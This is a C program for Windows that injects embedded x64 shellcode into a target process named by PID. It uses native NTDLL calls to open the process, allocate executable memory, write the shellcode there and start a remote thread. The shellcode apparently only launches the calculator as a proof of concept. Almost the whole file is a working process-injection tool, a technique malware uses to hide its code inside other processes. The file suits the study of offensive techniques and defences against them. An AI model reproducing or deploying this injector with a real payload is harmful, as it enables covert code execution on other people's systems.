#include "ntapi.h"

HMODULE GetModule(IN LPCWSTR moduleName)
{
    HMODULE hModule = NULL;
    hModule = GetModuleHandleW(moduleName);
    if (hModule == NULL)
    {
        warn("Error: failed to get handle to module, 0x%lx\n", GetLastError());
        return NULL;
    }
    else 
    {
        //okay("Got handle 0x%p to module %S", hModule, moduleName);
        okay("Got handle to module");
        info("[ %S ] --> [ 0x%p ]\n", moduleName, hModule);
        return hModule;
    }
}

int main(int argc, char* argv[])
{
    DWORD PID = NULL;
    HMODULE hNTDLL = NULL;
    PVOID bAddress = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    NTSTATUS STATUS;

    
    /* const keyword makes it so sc is placed in .rodata, unsigned char is mutable and in .data */
    unsigned char sc[] = 
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x00";

    SIZE_T scSize = sizeof(sc);
    SIZE_T bytesWritten = 0;
    
    if (argc < 2)
    {
        info("Usage: %s <PID>", argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]);
    hNTDLL = GetModule(L"NTDLL");

    /*init struct for ntOpenProcess*/
    OBJECT_ATTRIBUTES oa = {sizeof(oa), NULL };
    CLIENT_ID cid = { (HANDLE)PID, NULL };

    info("Populating prototypes...");
    NtOpenProcess open = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtAllocateVirtualMemory alloc = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
    NtWriteVirtualMemory write = (NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");
    NtCreateThreadEx thread = (NtCreateThreadEx)GetProcAddress(hNTDLL, "NtCreateThreadEx");
    NtClose close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
    
    okay("Attempting injection...");
    STATUS = open(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtOpenProcess returned NTSTATUS 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("Got handle for process");
    info("[ %ld ] --> [ 0x%p ]", PID, hProcess);

    STATUS = alloc(hProcess, &bAddress, NULL, &scSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtAllocateVirtualMemory returned NTSTATUS 0x%lx", STATUS);
        return EXIT_FAILURE;
    }
    okay("Allocated %ld bytes in process 0x%p", scSize, hProcess);
    
    STATUS = write(hProcess, bAddress, sc, sizeof(sc), &bytesWritten); //dont use scSize
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtWriteVirtualMemory returned NTSTATUS 0x%lx. %ld bytes had been written", STATUS, bytesWritten);
        return EXIT_FAILURE;
    }
    okay("Wrote %ld bytes into process 0x%p", scSize, hProcess);
    okay("Executing thread...");

    STATUS = thread(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, bAddress, NULL, 0, 0, 0, 0, NULL);
    if (STATUS != STATUS_SUCCESS)
    {
        warn("Error: NtCreateThreadEx returned NTSTATUS 0x%lx", STATUS);
    }
    okay("Thread created. Waiting for thread to finish...");

    WaitForSingleObject(hThread, INFINITE);
    okay("Thread finished! Cleaning up...");

    if(hThread) STATUS = close(hThread);
    if(hProcess) STATUS = close(hProcess);

    okay("Done!");
    return EXIT_SUCCESS;
}
